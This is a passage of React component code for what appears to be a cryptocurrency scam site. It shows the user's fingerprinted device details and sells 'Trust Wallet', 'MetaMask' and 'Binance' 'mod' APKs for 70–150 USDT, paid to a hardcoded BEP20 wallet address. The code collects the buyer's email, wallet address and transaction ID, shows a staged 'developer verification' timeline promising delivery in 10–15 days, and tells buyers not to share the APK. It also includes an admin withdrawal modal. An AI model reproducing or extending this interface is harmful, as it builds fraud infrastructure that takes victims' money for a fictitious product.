                      <p className="text-xs text-gray-500 uppercase mb-1">Browser</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.browser}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">OS</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.fullOSInfo}</p>
                    </div>
                  </div>

                  {/* Platform & Language */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Platform</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.platform}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Language</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.language}</p>
                    </div>
                  </div>

                  {/* Screen & Color Depth */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Screen</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.screen}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Color Depth</p>
                      <p className="font-bold text-purple-900 text-sm">{deviceDetails.colorDepth}</p>
                    </div>
                  </div>

                  {/* CPU Cores & RAM */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">CPU Cores</p>
                      <p className="font-bold text-purple-900">{deviceDetails.cores}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">RAM</p>
                      <p className="font-bold text-purple-900">{deviceDetails.memory}</p>
                    </div>
                  </div>

                  {/* Pixel Ratio & Status */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Pixel Ratio</p>
                      <p className="font-bold text-purple-900">{deviceDetails.pixelRatio}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Status</p>
                      <p className="font-bold text-purple-900">{deviceDetails.online}</p>
                    </div>
                  </div>

                  {/* Connection & Speed */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Connection Type</p>
                      <p className="font-bold text-purple-900">{deviceDetails.connection}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Speed</p>
                      <p className="font-bold text-purple-900">{deviceDetails.downlink}</p>
                    </div>
                  </div>

                  {/* Detection Time */}
                  <div className="p-4 bg-gradient-to-r from-purple-100 to-blue-100 rounded-lg border border-purple-300">
                    <p className="text-xs text-gray-500 uppercase tracking-wide mb-2">Detected At</p>
                    <p className="font-bold text-purple-900">{deviceDetails.timestamp}</p>
                    <p className="text-sm text-gray-700 mt-1">Timezone: {deviceDetails.timezone}</p>
                  </div>
                </div>
              )}
            </Card>

            {/* Wallet Selection */}
            <div className="space-y-4">
              <h3 className="font-bold text-purple-900">Select Wallet Type & Payment Amount</h3>
              <div className="grid grid-cols-1 gap-3">
                <Button
                  onClick={() => handleWalletSelection("Trust Wallet")}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-8 text-lg flex flex-col items-center gap-1"
                >
                  <span className="font-bold text-xl">Trust Wallet Mod</span>
                  <span className="text-sm bg-blue-800/50 px-3 py-1 rounded-full">Payment: 70 USDT (BEP20)</span>
                </Button>
                <Button
                  onClick={() => handleWalletSelection("MetaMask")}
                  className="w-full bg-orange-600 hover:bg-orange-700 text-white py-8 text-lg flex flex-col items-center gap-1"
                >
                  <span className="font-bold text-xl">MetaMask Mod</span>
                  <span className="text-sm bg-orange-800/50 px-3 py-1 rounded-full">Payment: 70 USDT (BEP20)</span>
                </Button>
                <Button
                  onClick={() => handleWalletSelection("Binance")}
                  className="w-full bg-yellow-600 hover:bg-yellow-700 text-white py-8 text-lg flex flex-col items-center gap-1"
                >
                  <span className="font-bold text-xl">Binance Mod</span>
                  <span className="text-sm bg-yellow-800/50 px-3 py-1 rounded-full">Payment: 150 USDT (BEP20)</span>
                </Button>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Payment Verification Modal */}
      <Dialog open={showPaymentModal} onOpenChange={setShowPaymentModal}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-purple-900">
              {selectedWalletType} Payment Verification
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-4">
            {/* Payment Amount Display */}
            <Card className="p-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white text-center">
              <p className="text-sm font-semibold mb-1">Required Payment</p>
              <p className="text-3xl font-bold">
                {selectedWalletType === "Binance" ? "150" : "70"} USDT
              </p>
              <p className="text-xs opacity-90 mt-1">Network: BEP20 (Binance Smart Chain)</p>
            </Card>

            {/* QR Code */}
            {qrCode && (
              <div className="flex flex-col items-center p-4 bg-white rounded-lg border-2 border-purple-200">
                <img src={qrCode} alt="Payment QR" className="w-48 h-48" />
                <p className="text-sm text-gray-600 mt-2">Scan to pay</p>
                <p className="text-xs text-purple-600 font-mono mt-1">0x88b583D062db2e954A237D7c229dCc79398527c5</p>
              </div>
            )}

            {/* Form */}
            <div className="space-y-3">
              <div>
                <Label>Your Email *</Label>
                <Input
                  type="email"
                  value={adminEmail}
                  onChange={(e) => setAdminEmail(e.target.value)}
                  placeholder="admin@example.com"
                />
              </div>

              <div>
                <Label>Your Wallet Address *</Label>
                <Input
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="0x..."
                />
              </div>

              <div>
                <Label>Transaction ID *</Label>
                <Input
                  value={transactionId}
                  onChange={(e) => setTransactionId(e.target.value)}
                  placeholder="0x..."
                />
              </div>

              <Button
                onClick={handlePaymentVerification}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                Verify Payment
              </Button>
            </div>

            {/* Warning */}
            <Card className="p-3 bg-yellow-50 border-yellow-200">
              <p className="text-xs text-yellow-800">
                ⚠️ <strong>Important:</strong> This mod wallet is built specifically for your device.
                Do not share or leak it. We are not responsible if the mod gets banned due to sharing.
              </p>
            </Card>
          </div>
        </DialogContent>
      </Dialog>

      {/* Roadmap Modal */}
      <Dialog open={showRoadmap} onOpenChange={setShowRoadmap}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-purple-900">Your Mod Wallet Progress</DialogTitle>
          </DialogHeader>

          {verificationData && (
            <div className="space-y-4">
              {/* Wallet Info */}
              <Card className="p-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white">
                <h3 className="font-bold text-xl mb-2">{verificationData.walletType} Mod</h3>
                <p className="text-sm opacity-90">{verificationData.modFileName}</p>
              </Card>

              {/* Timeline */}
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold">✓</div>
                  <div className="flex-1">
                    <h4 className="font-bold text-purple-900">Device Verified</h4>
                    <p className="text-sm text-gray-600">Mobile version: {deviceDetails?.mobileVersion}</p>
                  </div>
                </div>

                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold">✓</div>
                  <div className="flex-1">
                    <h4 className="font-bold text-purple-900">Payment Verified</h4>
                    <p className="text-sm text-gray-600">{verificationData.amount} USDT received</p>
                  </div>
                </div>

                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold animate-pulse">⏱</div>
                  <div className="flex-1">
                    <h4 className="font-bold text-purple-900">Developer Verification</h4>
                    <p className="text-sm text-gray-600">Estimated: 1-2 hours</p>
                  </div>
                </div>

                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 rounded-full bg-gray-300 flex items-center justify-center text-white font-bold">⏱</div>
                  <div className="flex-1">
                    <h4 className="font-bold text-purple-900">Mod Wallet Building</h4>
                    <p className="text-sm text-gray-600">Estimated: 1 hour</p>
                  </div>
                </div>

                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 rounded-full bg-gray-300 flex items-center justify-center text-white font-bold">📧</div>
                  <div className="flex-1">
                    <h4 className="font-bold text-purple-900">Delivery</h4>
                    <p className="text-sm text-gray-600">Will be sent to: {verificationData.adminEmail}</p>
                    <p className="text-xs text-gray-500 mt-1">Delivery: 10-15 days</p>
                  </div>
                </div>
              </div>

              {/* Instructions */}
              <Card className="p-4 bg-red-50 border-red-200">
                <h4 className="font-bold text-red-900 mb-2">⚠️ Important Instructions</h4>
                <ul className="text-sm text-red-800 space-y-1 list-disc list-inside">
                  <li>This mod is custom-built for your device capabilities</li>
                  <li>Do NOT share or leak this APK file</li>
                  <li>If leaked or shared, mod may get banned</li>
                  <li>We are not responsible for bans due to sharing</li>
                  <li>Keep your email secure - delivery link will be sent there</li>
                </ul>
              </Card>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Version Picker Modal - Auto-detect and proceed */}
      {showVersionPicking && (
        <Dialog open={showVersionPicking} onOpenChange={(open) => {
          if (!open) handleVersionPickerClose();
        }}>
          <DialogContent className="max-w-md">
            <DialogHeader>
              <DialogTitle className="text-2xl font-bold text-purple-900">
                Detecting Device Configuration
              </DialogTitle>
            </DialogHeader>
            <div className="flex flex-col items-center py-8">
              <div className="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mb-4" />
              <p className="text-gray-600">Please wait...</p>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {/* Withdrawal Modal */}
      {transferClaim && (
        <WithdrawalModal
          isOpen={showWithdrawalModal}
          onClose={() => {
            setShowWithdrawalModal(false);
            setWithdrawalCoinType(undefined);
            setWithdrawalCoinBalance(undefined);
          }}
          claim={transferClaim}
          maxAmount={calculateTotalBalance(transferClaim.balances)}
          isAdminMode={true}
          specificCoin={withdrawalCoinType}
          specificCoinBalance={withdrawalCoinBalance}
        />
      )}
    </div>
  );
}